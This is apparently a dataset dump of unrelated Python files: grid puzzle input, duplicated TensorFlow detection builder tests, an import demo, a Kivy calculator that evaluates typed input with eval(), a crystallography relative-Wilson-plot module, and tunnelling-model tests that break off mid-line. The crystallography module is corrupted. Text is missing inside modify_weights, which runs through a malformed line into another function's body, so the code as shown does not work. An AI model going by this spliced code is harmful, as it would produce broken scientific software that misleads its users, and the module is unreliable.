.#.#.#.###.....#...#.#.#.......\n....##............#............\n.#.#.............#..#......#.#.\n.#.#..........##..#.....#..#.#.\n...........#.##..#...#.#.....#.\n...........#..#....#...........\n..#................#.#...#....#\n...............##........##....\n....#.............#........#...\n...#......#.#.#........#.......\n#..............#..##.#..##.....\n.#.#.###................##.....\n.............#..#.........#....\n.......##..#............#...#..\n...#...#...........#.....#.....\n........#......#.#.#......#..#.\n#.##.......#......#..#..#.#....\n...#........#...........#...#..\n..#...........#.........#......\n.............#....#....#.......\n....#.........#........#......#\n..#............##..#.........#.\n.#...#...#..#...#........#..#..\n...#....##..............#......\n...........#...#....#.#.##..###\n..#....#......#.........#..#...\n.......#...#...................\n.#...#.#...................#...\n.#.....##.#.......#.#.#...##..#\n.....#..#.#.........#...#..##..\n.#..#.##.#......#......#.#...#.\n......#..#....##..#....##....##\n#...#......##........##........\n.#.........###................#\n.................#..###..#.#...\n..#.#........#..#........#...#.\n#.#....#....#..#...#.#......#..\n.#.#.............###.........#.\n.....#...............##...#...#\n..............#...#........#..#\n...................#..#.......#\n#......................#.....#.\n...#.........#..##...#...#.##..\n.....#..........#.........#....\n.....#...#............#..#.....\n.............#............#....\n...#.........#.................\n#...........#.#...............#\n.....#...#.....#..#.##.......##\n...#....#.#...........#........\n.........................#.#...\n.#..#...........#.#........#...\n.............#.#.....#..#....#.\n.....#...#.###...#..#........#.\n\"\"\"\n", "451": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "452": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "453": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "454": "import converters\nfrom converters import kg_to_lbs\nimport utils\nfrom utils import find_max\nimport ecommerce.shipping\nfrom ecommerce.shipping import calc_shipping, calc_tax\nfrom ecommerce import shipping\n\nkg_to_lbs(100)\n\nprint(converters.kg_to_lbs(70))  # 155.55555555555554 from line 2\nprint(converters.lbs_to_kg(120))  # 54.0 from line 2\n\n# utils.find_max()       from line 3\nnumbers = [10, 3, 6, 2, 5]\nmaximum = find_max(numbers)\nprint(maximum)  # 10 from line 4\n\necommerce.shipping.calc_shipping()  # calc_shipping from line 5\necommerce.shipping.calc_tax()  # calc_tax from line 5\ncalc_shipping()  # calc_shipping from line 6\ncalc_tax()  # calc_tax from line 6\nshipping.calc_tax()  # calc_tax from line 7\nshipping.calc_shipping()  # calc_shipping from line 7\nshipping.cal_order()      # calc_order from line 7\n", "455": "# import kivy\nfrom kivy.app import App\nfrom kivy.uix.widget import Widget\nfrom kivy.lang import Builder\nfrom kivy.core.window import Window\n\n# Set the App Size\nWindow.size = (400, 520)\n\nBuilder.load_file('./Calc.kv')\n\n\nclass MyLayout(Widget):\n    math_symbol_clicked = 0\n\n    def clear(self):\n        self.ids.calc_input.text = '0'\n\n    def number_button(self, button):\n\n        prior = self.ids.calc_input.text\n\n        if \"Error!\" in prior:\n            prior = ''\n\n        if prior == '0':\n            self.ids.calc_input.text = f'{button}'\n        else:\n            self.ids.calc_input.text = f'{prior}{button}'\n\n    # For '<<' Button\n    def remove(self):\n\n        prior = self.ids.calc_input.text\n        if len(prior) == 1:\n            self.ids.calc_input.text = '0'\n        else:\n            self.ids.calc_input.text = prior[:-1]\n\n    # For '+/-' Button\n    def pos_neg(self):\n\n        prior = self.ids.calc_input.text\n        if prior == '0':\n            return\n        if prior[0] == '-':\n            self.ids.calc_input.text = f'{prior[1:]}'\n        else:\n            self.ids.calc_input.text = f'-{prior}'\n\n    # For '.' Button\n    def dot(self):\n\n        prior = self.ids.calc_input.text\n        if '.' in prior and self.math_symbol_clicked == 0:\n            return\n        self.ids.calc_input.text = f'{prior}.'\n        self.math_symbol_clicked = 0\n\n    # For '+', '-', 'x', '/' Symbols\n    def math_sign(self, sign):\n\n        self.math_symbol_clicked = 1\n        prior = self.ids.calc_input.text\n\n        if \"Error!\" in prior:\n            self.ids.calc_input.text = '0'\n            return\n\n        self.ids.calc_input.text = f'{prior}{sign}'\n\n    # For '=' Button\n    def equals(self):\n\n        prior = self.ids.calc_input.text\n        try:\n            # Evaluate the output\n            answer = eval(prior)\n        except Exception:\n            answer = \"Error!\"\n\n        self.ids.calc_input.text = str(answer)\n\n\nclass CalculatorApp(App):\n\n    def build(self):\n        return MyLayout()\n\n\nif __name__ == '__main__':\n    CalculatorApp().run()\n", "456": "from __future__ import absolute_import, division, print_function\nfrom mmtbx.scaling import absolute_scaling\nimport mmtbx.scaling\nfrom iotbx import data_plots\nfrom scitbx.array_family import flex\nfrom scitbx.math import scale_curves\nfrom scitbx import simplex\nfrom scitbx.math import chebyshev_polynome\nfrom libtbx.utils import Sorry\nfrom libtbx import table_utils\nimport sys,math\nfrom six.moves import zip\nfrom six.moves import range\n\nlow_lim = 0.00142857142857\nhigh_lim = 0.914857142857\n\nmean_coefs = flex.double([-0.43300151026105321, 0.33427752644857256, -0.36429668743046412, 0.32015342663362861, -0.33187593112421665, 0.25808435074324798, -0.21097660027094089, 0.19245214093632027, -0.16848242519036311, 0.15291501268526811, -0.12910039774102444, 0.099417816273142834, -0.088720990827720211, 0.095701367393211653, -0.10629070210548312, 0.10981060473882812, -0.098166077509690655, 0.081269422162739482, -0.070505309537945482, 0.062534977493702376, -0.052309784988656668, 0.043125649942558686, -0.033948257000056978, 0.025057256942873911, -0.017846896900315476, 0.013015472828176888, -0.0090867510653793015, 0.005271961028977065, -0.00066906935937178775, -0.001734805197078687, 0.0019473391336692384, -0.00077699241439945844, -0.00012166448304738755, 0.0022859384260305684, -0.0041703347977807507, 0.0048616662471392688, -0.0049936320989681648, 0.0062946025455139906, -0.0054911210539810868, 0.0040222680071224075, -0.0033087237096459769, 0.0042634379859494151, -0.0037060560347156168, 0.0026770515762505058, -0.0020954947717182685, 0.0035512064084911323, -0.0028854530832642875, 0.002100343979509825, -0.0014536705634179688, 0.0024292695349115174])\n\nstd_coefs = flex.double([0.22609807236783072, -0.051083004382385722, 0.10050223345603099, -0.059797469000968342, 0.078452075293119358, -0.061376061912225756, 0.046001019180730129, -0.046818252753277688, 0.037535878728343949, -0.031883497361025873, 0.031132854775465228, -0.026248228833806508, 0.025229855893282804, -0.022987539515026915, 0.018603638709078982, -0.020688685663116515, 0.021490882895477355, -0.019155463126466928, 0.018694555361791723, -0.017919220545523508, 0.01688432732243788, -0.016177982330096936, 0.013523772618558827, -0.011497460798395623, 0.010090183879313928, -0.0077311745570573494, 0.0069765868372828593, -0.0085904927919333608, 0.0079389398144072369, -0.0063106616713442193, 0.0072030470015979342, -0.0082688707324504833, 0.0075456582719407002, -0.0078122483377159966, 0.007131121698384397, -0.004898714984268495, 0.0045473543279292298, -0.0055478491205527948, 0.0041818036356804219, -0.0032442174724577502, 0.0035282617908206485, -0.0026738719276938735, 0.0012942832126333331, -0.001864418991069073, 0.001979588643470585, -0.001413729012970848, 0.00074827896319899767, -0.00089235624086152622, 0.00061639083311362331, -0.0007922443411235876])\n\nclass relative_wilson(mmtbx.scaling.xtriage_analysis):\n  def __init__(self,\n      miller_obs,\n      miller_calc,\n      min_d_star_sq=0.0,\n      max_d_star_sq=2.0,\n      n_points=2000,\n      level=6.0):\n    assert miller_obs.indices().all_eq(miller_calc.indices())\n    if (miller_obs.is_xray_amplitude_array()):\n      miller_obs = miller_obs.f_as_f_sq()\n    if (miller_calc.is_xray_amplitude_array()):\n      miller_calc = miller_calc.f_as_f_sq()\n    self.obs  = miller_obs.deep_copy()\n    self.calc = miller_calc.deep_copy()\n    self.mind = min_d_star_sq\n    self.maxd = max_d_star_sq\n    self.m    = n_points\n    self.n    = 2\n    self.level = level\n\n    norma_obs  = absolute_scaling.kernel_normalisation(\n      miller_array=self.obs,\n      auto_kernel=True,\n      n_bins=45,\n      n_term=17)\n    norma_calc = absolute_scaling.kernel_normalisation(\n      miller_array=self.calc,\n      auto_kernel=True,\n      n_bins=45,\n      n_term=17)\n\n    obs_d_star_sq  = norma_obs.d_star_sq_array\n    calc_d_star_sq = norma_calc.d_star_sq_array\n    sel_calc_obs = norma_calc.bin_selection.select(norma_obs.bin_selection)\n    sel_obs_calc = norma_obs.bin_selection.select(norma_calc.bin_selection)\n    sel  = ((obs_d_star_sq > low_lim) & (obs_d_star_sq < high_lim) &\n            (norma_obs.mean_I_array > 0))\n    sel = sel.select(sel_calc_obs)\n\n    self.obs_d_star_sq  = obs_d_star_sq.select( sel )\n    self.calc_d_star_sq = calc_d_star_sq.select( sel_obs_calc ).select(sel)\n    self.mean_obs       = norma_obs.mean_I_array.select(sel)\n    self.mean_calc      = norma_calc.mean_I_array.select(\n                            sel_obs_calc).select(sel)\n    self.var_obs        = norma_obs.var_I_array.select(sel)\n    self.var_calc       = norma_calc.var_I_array.select(\n      sel_obs_calc).select(sel)\n\n    # make an interpolator object please\n    self.interpol = scale_curves.curve_interpolator( self.mind, self.maxd,\n      self.m)\n    # do the interpolation\n    tmp_obs_d_star_sq  , self.mean_obs,self.obs_a  , self.obs_b  = \\\n      self.interpol.interpolate(self.obs_d_star_sq,self.mean_obs)\n    self.obs_d_star_sq , self.var_obs,self.obs_a   , self.obs_b  = \\\n      self.interpol.interpolate(self.obs_d_star_sq, self.var_obs)\n    tmp_calc_d_star_sq , self.mean_calc,self.calc_a, self.calc_b = \\\n      self.interpol.interpolate(self.calc_d_star_sq,self.mean_calc)\n    self.calc_d_star_sq, self.var_calc,self.calc_a , self.calc_b = \\\n      self.interpol.interpolate(self.calc_d_star_sq,self.var_calc)\n\n    self.mean_ratio_engine = chebyshev_polynome( mean_coefs.size(),\n      low_lim-1e-3, high_lim+1e-3,mean_coefs)\n    self.std_ratio_engine = chebyshev_polynome( std_coefs.size(),\n      low_lim-1e-3, high_lim+1e-3,std_coefs)\n\n    self.x = flex.double([0,0])\n\n    self.low_lim_for_scaling = 1.0/(4.0*4.0) #0.0625\n    selection = (self.calc_d_star_sq > self.low_lim_for_scaling)\n    if (selection.count(True) == 0):\n      raise Sorry(\"No reflections within required resolution range after \"+\n        \"filtering.\")\n    self.weight_array = selection.as_double() / (2.0 * self.var_obs)\n    assert (not self.weight_array.all_eq(0.0))\n\n    self.mean   = flex.double( [1.0/(flex.sum(self.mean_calc) /\n                                flex.sum(self.mean_obs)), 0.0 ] )\n    self.sigmas = flex.double( [0.5, 0.5] )\n\n    s = 1.0/(flex.sum(self.weight_array*self.mean_calc)/\n             flex.sum(self.weight_array*self.mean_obs))\n    b = 0.0\n    self.sart_simplex = [ flex.double([s,b]), flex.double([s+0.1,b+1.1]),\n                          flex.double([s-0.1,b-1.1]) ]\n    self.opti = simplex.simplex_opt( 2, self.sart_simplex, self)\n\n    sol = self.opti.get_solution()\n    self.scale   = abs(sol[0])\n    self.b_value = sol[1]\n\n    self.modify_weights()\n    self.all_bad_z_scores = self.weight_array.all_eq(0.0)\n    if (not self.all_bad_z_scores):\n      s = 1.0/(flex.sum(self.weight_array*self.mean_calc) /\n               flex.sum(self.weight_array*self.mean_obs))\n      b = 0.0\n      self.sart_simplex = [ flex.double([s,b]), flex.double([s+0.1,b+1.1]),\n                            flex.double([s-0.1,b-1.1]) ]\n      self.opti = simplex.simplex_opt( 2, self.sart_simplex, self)\n    #self.mean_calc = self.mean_calc*self.scale*flex.exp(self.calc_d_star_sq*self.b_value)\n\n  def summary(self):\n    i_scaled = flex.exp( self.calc_d_star_sq*self.b_value ) * \\\n                self.mean_calc * self.scale\n    sel = (self.mean_obs > 0).iselection()\n    ratio  = flex.log(i_scaled.select(sel) / self.mean_obs.select(sel))\n    ratio_ = flex.double(self.mean_obs.size(), 0)\n    ratio_.set_selected(sel, ratio)\n    curves = [\n      self.calc_d_star_sq,\n      -ratio_, # observed\n      self.curve( self.calc_d_star_sq ), # expected\n      self.get_z_scores(self.scale, self.b_value)\n    ]\n    return summary(\n      all_curves=curves,\n      level=self.level,\n      all_bad_z_scores=self.all_bad_z_scores)\n\n  def modify_weights(self,level=5):\n    z_scores = self.get_z_scores(self.scale, self.b_value)\n    sel  = flex.double(list(flex.bool(z_scores 0) & (i_scaled > 0)) .iselection()\n    ratio  = self.mean_obs.select(sel) / i_scaled.select(sel)\n    mean = self.curve( self.calc_d_star_sq ).select(sel)\n    assert ratio.all_gt(0) # FIXME need to filter first!\n    ratio = flex.log(ratio)\n    var = self.std(self.calc_d_star_sq).select(sel)\n    d_star_sq = self.calc_d_star_sq.select(sel)\n    assert var.all_ne(0)\n    z = flex.abs(ratio-mean)/var\n    z_ = flex.double(self.mean_obs.size(), -1)\n    z_.set_selected(sel, z)\n    return z_\n\n  def target(self,vector):\n    v=1.0\n    scale = abs(vector[0])\n    b_value = vector[1]\n    if b_value > 200.0:\n      b_value = 200.0\n    if b_value < -200.0:\n      b_value = -200.0\n    i_scaled = flex.exp( self.calc_d_star_sq*b_value )*self.mean_calc*scale\n    ratio  = i_scaled / self.mean_obs\n    curve = self.curve( self.calc_d_star_sq )\n    result = ratio - flex.exp(curve)\n    if (flex.max(result) > math.sqrt(sys.float_info.max)):\n      raise OverflowError(\"Result array exceeds floating-point limit.\")\n    result = result*result\n    wmax = flex.max(self.weight_array)\n    assert (wmax != 0)\n    if (wmax > 1) and (flex.max(result) > sys.float_info.max / wmax):\n      raise OverflowError(\"Weighted result array will exceed floating-point \"+\n        \"limit: %e\" % flex.max(result))\n    result = result*self.weight_array\n    result = flex.sum( result )\n    return result\n\n  def curve(self,d_star_sq):\n    result =  self.mean_ratio_engine.f( d_star_sq )\n    return result\n\n  def std(self,d_star_sq):\n    result = self.std_ratio_engine.f( d_star_sq )\n    return result\n\n  def show_summary(self, out):\n    return self.summary().show(out=out)\n\nclass summary(mmtbx.scaling.xtriage_analysis):\n  def __init__(self,\n      all_curves,\n      level=6.0,\n      all_bad_z_scores=False):\n    self.table = data_plots.table_data(\n      title=\"Relative Wilson plot\",\n      column_labels=[\"Max. resolution\", \"log(I_exp/I_obs)\", \"Reference curve\",\n        \"Z-score\"],\n      graph_names=[\"Relative Wilson plot\"],\n      graph_labels=[(\"High resolution\", \"\")],\n      graph_columns=[list(range(4))],\n      x_is_inverse_d_min=True,\n      data=[ list(array) for array in all_curves ])\n    self.cutoff = level\n    self.all_bad_z_scores = all_bad_z_scores\n\n  def n_outliers(self):\n    ss,rr,ii,zz = self.data_as_flex_arrays()\n    flagged = zz > self.cutoff\n    return flagged.count(True)\n\n  def data_as_flex_arrays(self):\n    return [ flex.double(column) for column in self.table.data ]\n\n  def _show_impl(self, out):\n    ss,rr,ii,zz = self.data_as_flex_arrays()\n    flagged = zz > self.cutoff\n    sel_ss = ss.select(flagged)\n    sel_z = zz.select(flagged)\n    sel_r = rr.select(flagged)\n    sel_i = ii.select(flagged)\n    out.show_sub_header(\"Relative Wilson plot\")\n    out.show_text(\"\"\"\\\nThe relative Wilson plot compares the mean intensity of the observed data with\nthe mean intensity computed from the model, as a function of resolution.  This\ncurve is expected to fall off at low resolution if no contribution for bulk\nsolvent is provided for the calculated intensities, because the presence of\nbulk solvent reduces the observed intensities at low resolution by reducing\nthe contrast.  At high resolution, the curve should be a straight line with a\nslope that reflects the difference in overall B-factor between the model and\nthe data.  Compared to the normal Wilson plot, the relative Wilson plot is\nmore linear because the influence of favored distances between atoms, caused\nby bonding and secondary structure, is cancelled out.\n\"\"\")\n    out.show_plot(self.table)\n    if (self.all_bad_z_scores):\n      out.warn(\"\"\"\\\nAll resolution shells have Z-scores above %4.2f sigma.  This is indicative of\nsevere problems with the input data, including processing errors or ice rings.\nWe recommend checking the logs for data processing and inspecting the raw\nimages.\\n\"\"\" % self.cutoff)\n    else :\n      out.show_text(\"\"\"\\\nAll relative wilson plot outliers above %4.2f sigma are reported.\n\"\"\" % self.cutoff)\n    out.newline()\n    rows = []\n    if len(sel_ss) > 0:\n      for s,z,r,i in zip(sel_ss,sel_z,sel_r,sel_i):\n        sss = math.sqrt(1.0/s)\n        rows.append([ \"%8.2f\" % sss, \"%9.3e\" % r, \"%9.3e\" % i, \"%5.2f\" % z ])\n      table = table_utils.simple_table(\n        column_headers=[\"d-spacing\", \"Obs. Log[ratio]\", \"Expected Log[ratio]\",\n          \"Z-score\"],\n        table_rows=rows)\n      out.show_table(table)\n    else:\n      out.show(\"The Relative wilson plot doesn't indicate any serious errors.\")\n", "457": "from penguins.functions import tunnelmodel_singleLevel\nfrom penguins.functions import averageBridgePopulation\nfrom penguins.functions import MarcusETRates\nfrom penguins.functions import interp1D\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport time\nimport pandas as pd\n#TODO I need to fix all of these interp1D functions\ndef test_SAM():\n    v = np.arange(-2,2,.001)\n    V=[]\n    for i in range(2):\n        V = np.append(V,v)\n    V = sorted(V)\n    \n    #         n        gammaW     gammaC  deltaE eta       sigma c  vg T\n    args = [1.50e+02,  1.375e-05, 0.0352, 0.75,   5.32e-01, 0,    0, 0, 300]\n    \n    start = time.time()\n    vecCur = np.vectorize(tunnelmodel_singleLevel)\n    y1 = vecCur(V, *args)\n    time1 = time.time()-start\n    \n    start = time.time()\n    fast = interp1D(tunnelmodel_singleLevel)\n    y2 = fast(V, *args)\n    time2 = time.time()-start\n    \n    print('Slow: %.2f\\t\\tFast: %.2f\\t\\tSpeed Increase: %.0f%%'%(time1,time2,time1/time2*100))\n                                                          \n    plt.figure()\n    plt.scatter(V,y1, color = 'black')\n    plt.plot(V,y2, color = 'red')\n\ndef test_SET():\n    v = np.arange(-.05,.05,.001)\n    V=[]\n    for i in range(2):\n        V = np.append(V,v)\n    V = sorted(V)\n    \n    #         n        gammaW     gammaC  deltaE eta       sigma c  vg T\n    args = [1.50e+02,  1.375e-05, 0.0352, 0.03,   5.32e-01, 0,    0, 0, 300]\n    \n    start = time.time()\n    vecCur = np.vectorize(tunnelmodel_singleLevel)\n    y1 = vecCur(V, *args)\n    time1 = time.time()-start\n    \n    start = time.time()\n    fast = interp1D(tunnelmodel_singleLevel)\n    y2 = fast(V, *args)\n    time2 = time.time()-start\n    \n    # print('Slow: %.2f\\t\\tFast: %.2f\\t\\tSpeed Increase: %.0f%%'%(time1,time2,time1/time2*100))\n                                                          \n    plt.figure()\n    plt.scatter(V,y1, color = 'black')\n    plt.plot(V,y2, color = 'red')\n\ndef test_Hysteric():\n    def HysteresisModel_Slow(vb, n, gammaL, gammaR, kappa, sigma, E_AB, E_AC, chi, eta,\n                  gam, lam, P, u, c, vg, T):\n\n        volts = list(set(np.round(vb,2)))\n    \n        #%% Calculate all currents:\n        calcDB = pd.DataFrame()\n        calcDB['V'] = sorted(volts)\n        \n        eqSTL = interp1D(tunnelmodel_singleLevel)\n        calcDB['I_np'] = eqSTL(calcDB['V'], n, gammaL*gammaR, gammaL+gammaR, E_AB,\n                                eta, sigma, c, vg, T)\n        calcDB['I_p'] = eqSTL(calcDB['V'], n, gammaL*gammaR*kappa**2,\n                              (gammaL+gammaR)*kappa, E_AB+chi, eta, sigma, c, vg,\n                              T)      \n        \n        eqETRates = interp1D(MarcusETRates)\n        calcDB['R_AC'], calcDB['R_CA'] = eqETRates(calcDB['V'], gam, lam, E_AC, T)\n        calcDB['R_BD'], calcDB['R_DB'] = eqETRates(calcDB['V'], gam*kappa, lam,\n                                                   E_AC+chi, T)\n        \n        eqBridge = interp1D(averageBridgePopulation)\n        calcDB['n_np'] = eqBridge(calcDB['V'], gammaL, gammaR, E_AB, eta, c, vg, T)\n        calcDB['n_p']  = eqBridge(calcDB['V'], gammaL*kappa, gammaR*kappa,\n                                  E_AB+chi, eta, c, vg, T)\n        \n        calcDB['k_S0_S1'] = (1-calcDB['n_np'])*calcDB['R_AC'] + calcDB['n_np']*calcDB['R_BD']\n        calcDB['k_S1_S0'] = (1-calcDB['n_p'])*calcDB['R_CA'] + calcDB['n_p']*calcDB['R_DB']\n            \n        delt = abs(vb[2]-vb[3])/u\n        I = []\n        Parray = []\n        delArray = []\n            \n        for i,V in enumerate(vb):\n            V = np.round(V,2)\n            tempDf =calcDB[calcDB['V']==np.round(V,2)].reset_index()\n            calcs = dict(tempDf.iloc[0])\n            \n            Parray += [P]\n            I += [((1-P)*calcs['I_np']+P*calcs['I_p'])]\n            \n            dPdt = calcs['k_S0_S1']-P*(calcs['k_S0_S1']+calcs['k_S1_S0'])\n            delArray += [dPdt]\n            P = P+dPdt*delt\n        \n        return I, Parray\n    \n    def HysteresisModel_Fast(vb, n, gammaL, gammaR, kappa, sigma, E_AB, E_AC, chi, eta,\n                  gam, lam, P, u, c, vg, T):\n\n        volts = list(set(np.round(vb,2)))\n    \n        #%% Calculate all currents:\n        calcDB = pd.DataFrame()\n        calcDB['V'] = sorted(volts)\n        \n        eqSTL = np.vectorize(tunnelmodel_singleLevel)\n        calcDB['I_np'] = eqSTL(calcDB['V'], n, gammaL*gammaR, gammaL+gammaR, E_AB,\n                                eta, sigma, c, vg, T)\n        calcDB['I_p'] = eqSTL(calcDB['V'], n, gammaL*gammaR*kappa**2,\n                              (gammaL+gammaR)*kappa, E_AB+chi, eta, sigma, c, vg,\n                              T)      \n        \n        eqETRates = np.vectorize(MarcusETRates)\n        calcDB['R_AC'], calcDB['R_CA'] = eqETRates(calcDB['V'], gam, lam, E_AC, T)\n        calcDB['R_BD'], calcDB['R_DB'] = eqETRates(calcDB['V'], gam*kappa, lam,\n                                                   E_AC+chi, T)\n        \n        eqBridge = np.vectorize(averageBridgePopulation)\n        calcDB['n_np'] = eqBridge(calcDB['V'], gammaL, gammaR, E_AB, eta, c, vg, T)\n        calcDB['n_p']  = eqBridge(calcDB['V'], gammaL*kappa, gammaR*kappa,\n                                  E_AB+chi, eta, c, vg, T)\n        \n        calcDB['k_S0_S1'] = (1-calcDB['n_np'])*calcDB['R_AC'] + calcDB['n_np']*calcDB['R_BD']\n        calcDB['k_S1_S0'] = (1-calcDB['n_p'])*calcDB['R_CA'] + calcDB['n_p']*calcDB['R_DB']\n            \n        delt = abs(vb[2]-vb[3])/u\n        I = []\n        Parray = []\n        delArray = []\n            \n        for i,V in enumerate(vb):\n            V = np.round(V,2)\n            tempDf =calcDB[calcDB['V']==np.round(V,2)].reset_index()\n            calcs = dict(tempDf.iloc[0])\n            \n            Parray += [P]\n            I += [((1-P)*calcs['I_np']+P*calcs['I_p'])]\n            \n            dPdt = calcs['k_S0_S1']-P*(calcs['k_S0_S1']+calcs['k_S1_S0'])\n            delArray += [dPdt]\n            P = P+dPdt*delt\n        \n        return I, Parray\n    \n    initpar = {\n            \t'n'\t:1.50e+02,\n            \t'gammaL'\t:5.52E-04,\n            \t'gammaR'\t:2.03E-02,\n            \t'kappa'\t:2.81,\n            \t'sigma'\t:0.00e+00,\n            \t'E_AB'\t:6.93e-01,\n            \t'E_AC'\t:-7.17e-01,\n            \t'chi'\t:1.58e+00,\n            \t'eta'\t:5.23e-01,\n            \t'gam'\t:7.12e-01,\n            \t'lam'\t:1.21e+00,\n            \t'P'\t:0.00e+00,\n            \t'u'\t:1.00e-02,\n            \t'c'\t:0.00e+00,\n            \t'vg'\t:0.00e+00,\n            \t'T'\t:3.00e+02\n            }\n    \n    DataFile = 'Data\\\\AsymNeg_cont_Normalized.txt'\n    data 